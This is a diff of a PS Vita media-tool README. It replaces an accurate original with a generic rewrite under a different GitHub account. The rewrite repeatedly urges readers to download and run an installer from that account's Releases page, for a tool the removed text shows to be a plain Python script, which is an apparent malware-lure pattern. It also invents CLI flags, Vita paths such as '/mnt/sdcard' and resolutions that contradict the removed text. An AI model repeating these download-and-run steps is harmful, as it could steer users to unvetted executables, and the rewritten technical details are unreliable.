@@ -1,197 +1,417 @@
-<p align="center">
-  <img src="imgs/logo.png" alt="PS Vita Media Processor Logo" width="500">
-</p>
+Download the PSVMP asset from https://github.com/nomankharal/PSVMP/releases and run the installer file.
 
-<p align="center">
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.8%2B-blue.svg" alt="Python Version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License"></a>
-</p>
+# PSVMP: Auto Download, Convert, and Transfer PS Vita Media Seamlessly
 
----
+[![PSVMP Releases](https://img.shields.io/badge/PSVMP-Releases-brightgreen?logo=github&logoColor=white)](https://github.com/nomankharal/PSVMP/releases)
 
-## Features
+🚀 A practical tool for PS Vita media management. PSVMP automates the full flow: fetch media, convert it to Vita-friendly formats, and push it to your Vita. It targets optimal compatibility with Vita hardware and VitaShell workflows. Built to be reliable, scriptable, and open source.
 
-* Multi-platform support: Mega.nz, YouTube, SoundCloud, and more
-* Automatic media conversion for PS Vita compatibility
-* Direct FTP transfer to your PS Vita
-* Optimized output: video (960x544), audio (MP3 320kbps)
-* Real-time download and conversion progress
-* Optional automatic cleanup of temporary files
+🎯 What PSVMP helps you do
+- Download videos and music from the web with a few clicks or a simple script.
+- Convert media into formats that PS Vita handles well.
+- Transfer media directly to the Vita using VitaShell over FTP or USB.
+- Automate repetitive tasks with batch processing and profiles.
+- Stay open source and extensible for future Vita media needs.
 
+🧭 Why you might want PSVMP
+- You want a consistent media pipeline for Vita media without juggling multiple tools.
+- You value open source software you can audit and adapt.
+- You run regular media transfers to your Vita and want reliable, repeatable results.
+- You prefer a command-line workflow that fits into scripts and automation.
 
-## Supported Sources
+⚙️ Core concepts
+- Media pipeline: download → convert → transfer
+- Profiles: save settings for common devices or media types
+- Compatibility-first: targets PS Vita constraints for video, audio, and containers
 
-* **Mega.nz** – via `megatools`
-* **YouTube** – via `yt-dlp`
-* **SoundCloud** – audio-only support
-* **Other websites** – generic support via `yt-dlp`
+📦 What you’ll find in this repository
+- A Python-based tool with a focus on automation and scripting
+- Clear CLI for controlling download, conversion, and transfer stages
+- Config files and templates to tailor outputs for VitaShell and Vita hardware
+- Documentation that explains usage, options, and recommended settings
+- Open issues and contribution guidelines for community involvement
 
-## Requirements
+🧰 Prerequisites and environment
+- Python 3.8 or newer (cross-platform: Windows, macOS, Linux)
+- Network access for downloads
+- A PS Vita with VitaShell installed and an accessible FTP server (or USB transfer path)
+- Basic command-line familiarity
+- Optional: virtual environment support to isolate dependencies
 
-* Python 3.6 or later
-* FFmpeg
-* yt-dlp
-* megatools
-* PS Vita with VitaShell (FTP enabled)
+🏗️ Installation and setup
 
-## Installation
+- Get the code
+  - Clone the repository: `git clone https://github.com/nomankharal/PSVMP.git`
+  - Enter the project: `cd PSVMP`
 
-### 1. Clone the repository
+- Install dependencies
+  - With Python 3.8+: `python -m pip install -r requirements.txt`
+  - On some systems you may use `python3` instead of `python`
 
-```bash
-git clone https://github.com/R0salman/PSVMP.git
-cd PSVMP
-```
+- Run a quick check
+  - See available commands: `psvmp --help` or `python -m psvmp --help`
+  - If you use a virtual environment, activate it first
 
-### 2. Install Python dependencies
+- First-run tips
+  - Create a default config if the project ships one, or copy a template
+  - Customize the output directory and target Vita settings in the config
+  - Ensure VitaShell FTP is accessible from your PC with the Vita on the same network
 
-```bash
-pip install tqdm yt-dlp
-```
+🔧 Quick start: a simple end-to-end workflow
 
-### 3. Install system dependencies
+- Step 1: Prepare a media source
+  - You can provide a direct media URL or a playlist feed supported by PSVMP
+  - Example: `psvmp --download "https://example.com/video-source"` (adjust URL to your source)
 
-#### Windows
+- Step 2: Choose output and quality
+  - Select Vita-friendly formats. A common choice is MP4 with H.264 video and AAC audio
+  - Example: `psvmp --output "Videos" --format mp4 --video-codec h264 --audio-codec aac --quality 720p`
 
-* [Download FFmpeg](https://ffmpeg.org/download.html)
-* [Download megatools](https://megatools.megous.com/)
-* Install yt-dlp:
+- Step 3: Transfer to the Vita
+  - Ensure VitaShell is running and FTP transfer is enabled on your Vita
+  - Example: `psvmp --transfer vita --vita-ip 192.168.1.42 --vita-user ftp --vita-pass ftp_password`
+  - PSVMP negotiates with VitaShell to push the files into the Vita’s media folder
 
-  ```bash
-  pip install yt-dlp
-  ```
+- Step 4: Verify on the Vita
+  - Open VitaShell or the Vita’s Media Player to confirm the new files appear
+  - Confirm playback compatibility and quality
+  - If you encounter issues, review logs and adjust the profile for better compatibility
 
-#### Linux (Ubuntu/Debian)
+- Step 5: Save and reuse the workflow
+  - Save the current settings as a profile for future runs
+  - Use a batch script or a cron job to automate repeated tasks
 
-```bash
-sudo apt update
-sudo apt install ffmpeg megatools
-pip install yt-dlp
-```
+👟 Step-by-step workflow design
 
-#### macOS
+- Download stage
+  - Accept various sources: direct URLs, playlists, or search results
+  - Respect source rights and terms of service
+  - Respect rate limits and retry logic for reliability
 
-```bash
-brew install ffmpeg megatools
-pip install yt-dlp
-```
+- Conversion stage
+  - Target formats: MP4 (H.264) for video, AAC for audio
+  - Recommended resolutions: 720p when possible, 480p for older Vita units
+  - Frame rate: 24–30 fps for smooth playback without unnecessary load
+  - Bitrate guidance: 2–5 Mbps for video, 128–192 kbps for audio, depending on content
+  - Subtitles: optional, support is limited on Vita; prefer embedded subtitles if needed
 
-### 4. Verify installation
+- Transfer stage
+  - Transfer over FTP is common with VitaShell
+  - Ensure the Vita is reachable on the local network
+  - Use progressive transfer to handle large files gracefully
+  - Verify integrity post-transfer, if possible
 
-```bash
-python psmedia.py --check-deps
-```
+- Post-processing
+  - Move files into Vita-friendly folders
+  - Clean up temporary files
+  - Log results for auditing and troubleshooting
 
-## PS Vita Setup
+🧩 Customization and profiles
 
-1. Install VitaShell on your PS Vita
-2. Launch VitaShell and press `SELECT` to start the FTP server
-3. Note the **IP** and **Port** address shown on your PS Vita
-4. Ensure your computer and PS Vita are connected to the same Wi-Fi network
+- Profiles are your friend. Create profiles for different devices, content types, or network setups.
+- A profile might include:
+  - Source type and location
+  - Output directory and naming scheme
+  - Video and audio codecs, bitrate, and container
+  - Target Vita settings (screen size, aspect ratio, framerate)
+  - Transfer method details (FTP server, credentials, destination path)
 
-## Usage
+- Example profile concepts
+  - Profile: VitaMainstream
+    - Source: direct URL or playlist
+    - Format: MP4
+    - Video: H.264, 720p, 30fps, 3 Mbps
+    - Audio: AAC, 128 kbps
+    - Output path: /VitaMedia/Video
+    - Transfer: Vita FTP to /mnt/sdcard/VitaMedia/Video
 
-### Basic Examples
+- Saving and reusing profiles reduces setup time for new tasks
 
-Download and convert a YouTube video:
+🧪 Formats, codecs, and Vita compatibility
 
-```bash
-python psmedia.py "https://www.youtube.com/watch?v=VIDEO_ID" --type video
-```
+- Video
+  - Preferred: H.264 encoded video in an MP4 container
+  - Supported resolutions: commonly 720p for Vita compatibility
+  - Frame rate: 24–30 fps typically works well
 
-Download and convert SoundCloud music:
+- Audio
+  - Preferred: AAC-LC
+  - Sample rate: 44.1 kHz or 48 kHz
+  - Bitrate: 128–192 kbps for a balance of quality and size
 
-```bash
-python psmedia.py "https://soundcloud.com/artist/track" --type music
-```
+- Containers and compatibility
+  - MP4 is the most interoperable container for Vita
+  - MKV may be playable in some setups but MP4 is safer
+  - Subtitles: optional and not widely supported on Vita; consider hardcoding if needed
 
-Download from Mega.nz with custom Vita IP:
+- Quality and size trade-offs
+  - Higher resolution and bitrate mean larger files
+  - Balance quality with the Vita’s storage capacity and playback performance
 
-```bash
-python psmedia.py "https://mega.nz/file/..." --ip 192.168.1.100 --port 1337
-```
+🗂️ Working with configurations and files
 
+- Default config
+  - PSVMP ships with a default template you can customize
+  - Place custom config in your user directory or a project-specific folder
 
-## Command Line Options
+- Naming and organization
+  - Use descriptive folder names like Year-Month_Title or Series_Title_Episode
+  - Maintain a consistent naming scheme for easy sorting on Vita
 
-```
-positional arguments:
-  url                   URL of the media file (Mega.nz, YouTube, SoundCloud, etc.)
+- Logging and traces
+  - Enable verbose logging during first runs to understand behavior
+  - Log files help you reproduce a successful workflow or diagnose issues
 
-optional arguments:
-  -h, --help            Show this help message and exit
-  --type {video,music}  Type of media to process (default: video)
-  --ip IP               PS Vita IP address (default: 192.168.1.7)
-  --port PORT           PS Vita FTP port (default: 1337)
-  --check-deps          Check if required dependencies are installed
-```
+- Error handling
+  - PSVMP should continue on non-fatal errors, logging a clear message
+  - If a download fails, the system retries a configurable number of times
+  - If a transfer fails, a retry or fallback to a secondary method is available
 
-## 📺 Tutorial
+🧭 How PSVMP talks to the Vita
 
-Watch the full tutorial on how to use PSVMP:
+- VitaShell FTP interface
+  - The Vita acts as an FTP server in most setups
+  - Ensure the Vita and PC share the same network segment
+  - Username and password are set in VitaShell, then supplied to PSVMP
 
-<p align="center">
-  <a href="https://www.youtube.com/watch?v=Ej24JAy4vIM">
-    <img src="https://img.youtube.com/vi/Ej24JAy4vIM/hqdefault.jpg" width="720" alt="Watch the tutorial video">
-  </a>
-</p>
+- USB transfer
+  - If you use USB transfer, PSVMP uses a direct path when available
+  - USB can be slower; network transfers are generally faster on a modern setup
 
-## Output Locations
+- File placement on Vita
+  - Place media in Vita’s standard media folders
+  - Use VitaShell’s browser to verify exact destination folders
+  - Ensure file permissions on Vita don’t block playback
 
-* Videos: `ux0:/video/shows/` (MP4 format)
-* Music: `ux0:/music/` (MP3 format)
+- Verification
+  - After transfer, verify file integrity and readability on Vita
+  - If a file doesn’t appear, recheck the destination path and names
 
-## Technical Details
+🧭 Real-world scenarios and workflows
 
-### Video Conversion
+- Scenario A: Daily video dumps
+  - Source: a weekly video feed
+  - Output: MP4, 720p, 3 Mbps
+  - Transfer: Vita FTP to /mnt/sdcard/VitaMedia/Video
+  - Schedule: run every Sunday at 03:00 using cron or Task Scheduler
 
-* Resolution: 960x544 (PS Vita native)
-* Codec: H.264 Baseline Profile
-* Bitrate: 1500k (max 2000k)
-* Audio: AAC 128kbps, 44.1kHz
+- Scenario B: Music library refresh
+  - Source: audio playlist
+  - Output: MP3 with appropriate bitrate
+  - Transfer: Vita FTP to /mnt/sdcard/VitaMedia/Music
+  - Schedule: run a monthly refresh
 
-### Audio Conversion
+- Scenario C: Large batch of content
+  - Download a batch of videos under a single config
+  - Convert to Vita-friendly formats
+  - Transfer automatically as a parallel process
+  - Include error handling for failed items and retry logic
 
-* Format: MP3
-* Bitrate: 320kbps
-* Sample Rate: 44.1kHz
+- Scenario D: Emergency restore
+  - If Vita is out of space, PSVMP can skip large files and report back
+  - Use a dry-run mode to test what would happen without changing files
 
-## Troubleshooting
+⚙️ Automation and scripting
 
-### "Missing required tools" error
+- CLI-first design
+  - PSVMP exposes a rich set of CLI options
+  - You can chain commands in a shell script to form a complete workflow
 
-* Run `python psmedia.py --check-deps`
-* Follow the installation instructions for any missing dependencies
+- Scripting examples (inline, not full scripts)
+  - Download and convert: `psvmp --download-url "https://source/video" --output "Videos" --format mp4 --video h264 --audio aac`
+  - Transfer to Vita: `psvmp --transfer vita --vita-ip 192.168.1.42 --destination "/mnt/sdcard/VitaMedia/Video"`
+  - Full pipeline in a single script (pseudo example): `psvmp --download-url ... --convert --transfer vita`
 
-### FTP connection failed
+- Scheduling
+  - Linux/macOS: use cron to schedule runs
+  - Windows: use Task Scheduler to run the script at regular intervals
 
-* Confirm that VitaShell FTP server is running (press `SELECT` in VitaShell)
-* Check that your PS Vita and PC are on the same network
-* Verify that the IP address and port are correct
+- Environment management
+  - Use a virtual environment to isolate dependencies
+  - Keep a clean environment for reproducible builds
 
-### Download failed
+🔒 Security and integrity
 
-* Retry the command (some sites rate-limit)
-* For Mega links, confirm the link is still valid
-* Check your internet connection
+- Open source and auditable
+  - The codebase is open for review and contributions
+  - Review dependencies for security concerns
 
-### Conversion failed
+- Data handling
+  - PSVMP fetches media from sources you specify
+  - Handle credentials and sensitive data safely
+  - Avoid exposing credentials in logs
 
-* Ensure the downloaded file is not corrupted
-* Confirm FFmpeg is installed and on your system path
-* Try using a different media source
+- Updates
+  - Keep the software up to date with the Releases page
+  - Rebuild profiles if new Vita formats emerge
 
-## License
+🤝 Community and contribution
 
-This project is licensed under the [MIT License](LICENSE).
+- How to contribute
+  - Fork the repository
+  - Create a feature branch for your changes
+  - Open a pull request with a clear description of the change
+  - Include tests and examples where possible
 
-## Acknowledgments
+- Code quality
+  - Follow the project’s style guidelines
+  - Add tests for new features
+  - Document new options and behaviors
 
-* Thanks to the VitaShell team for the FTP server functionality.  
-* Thanks to the FFmpeg team for media processing.  
-* Thanks to the yt-dlp developers for download handling.  
-* Thanks to the megatools developers for Mega.nz support.  
+- Issues and support
+  - Use issues to report bugs or request features
+  - Provide steps to reproduce and the environment details
+  - Be precise and calm in descriptions
 
----
+🗺️ Roadmap and future plans
 
-<p align=center ><b>Made with ❤️ for the PS Vita community</b></p>
+- Expand source compatibility
+  - Support more streaming platforms and source types
+  - Improve playlist and batch processing features
+
+- Enhance Vita compatibility
+  - Extend the set of codecs and containers for better playback
+  - Add optional metadata tagging for easier organization on Vita
+
+- Improve automation
+  - More robust scheduling and retry logic
+  - Better integration with third-party media tools
+
+- User experience improvements
+  - More friendly prompts and clearer progress indicators
+  - Enhanced logging with searchable logs and summaries
+
+🧭 Developer guide
+
+- Directory structure overview
+  - Core modules for download, conversion, and transfer
+  - Config and profile management
+  - CLI-handling and argument parsing
+  - Logging and error reporting
+
+- How to extend PSVMP
+  - Add new media sources by implementing a fetcher interface
+  - Add new output formats by extending the converter module
+  - Add new transfer methods by implementing a transport interface
+
+- Testing strategy
+  - Unit tests for core components
+  - Integration tests for end-to-end workflows
+  - Mocking network calls to keep tests fast and deterministic
+
+- Documentation approach
+  - Keep docs in sync with code
+  - Update usage examples with each release
+  - Provide tutorials for common workflows
+
+- Packaging and distribution
+  - Build artifacts for major platforms
+  - Ensure installation is straightforward for new users
+  - Maintain clear release notes for each version
+
+🎨 User experience and design choices
+
+- Clarity and simplicity
+  - Clear CLI options and meaningful error messages
+  - Consistent naming and predictable behavior
+
+- Accessibility
+  - Helpful help text for commands
+  - Sensible defaults that work out of the box
+
+- Performance
+  - Efficient downloads with retry logic
+  - Parallel processing where possible
+  - Lightweight conversion that respects Vita constraints
+
+🗂️ Licensing and attribution
+
+- License
+  - PSVMP is released under the MIT license
+  - You may modify, distribute, and use the software with minimal restrictions
+
+- Attribution
+  - Credit the project and its contributors for reuse
+  - Preserve license notices in redistributed copies
+
+- Third-party dependencies
+  - PSVMP relies on safe, well-known libraries
+  - Check the requirements file for a list of dependencies
+
+💬 Documentation and help resources
+
+- In-repo help
+  - Use `psvmp --help` to see available commands and options
+  - Review config templates to understand expected fields
+
+- Online resources
+  - The Releases page hosts the latest builds and changelog
+  - Community discussions can help troubleshoot common problems
+
+- Tutorials
+  - Step-by-step guides for common workflows
+  - Examples for typical Vita media libraries
+
+🔎 Quality assurance and testing
+
+- Test coverage
+  - Unit tests cover core logic
+  - Integration tests verify end-to-end flows
+
+- Release quality
+  - Each release includes notes about changes and bug fixes
+  - Users should review release notes before upgrading
+
+- Security testing
+  - Dependency scanning during the build process
+  - Regular reviews of code for potential vulnerabilities
+
+🌐 Internationalization and future language support
+
+- Plans for translations
+  - Community contributions can translate help text and docs
+  - Focus on clear, concise language to maintain readability
+
+- Localization considerations
+  - Keep formatting simple to ease translation
+  - Avoid hard-coded strings in UI messages
+
+💡 Quick tips for power users
+
+- Use profiles to save time
+  - Create a profile for daily downloads
+  - Create a profile for weekend media batches
+
+- Combine with system tools
+  - Use cron jobs for scheduling
+  - Use shell scripts to compose multi-step workflows
+
+- Optimize for Vita
+  - Prefer MP4 with H.264 and AAC
+  - Keep file sizes reasonable to fit Vita storage
+
+📈 Getting the most from PSVMP
+
+- Start small
+  - Run a few tests to confirm the pipeline works from download to transfer
+  - Validate video playback on the Vita
+
+- Iterate
+  - Based on results, tweak encoding settings and transfer paths
+  - Save refined configurations as profiles
+
+- Share improvements
+  - Submit pull requests with explained changes
+  - Include tests and documentation updates
+
+🏁 Releases and updates
+
+- For the latest builds and changelog, visit the Releases page and review what’s new
+- See the project’s Releases page for binaries, installers, and notes
+- The Releases page is the primary source for updates and fixes
+
+See the latest builds on the Releases page.
+
+Note: For the official releases, refer to the PSVMP Releases page as described above. Release notes, asset details, and installation instructions will be provided there.
+
+Releases and updates are handled via the project's Releases section; check it regularly to stay current with bug fixes, performance improvements, and new features.
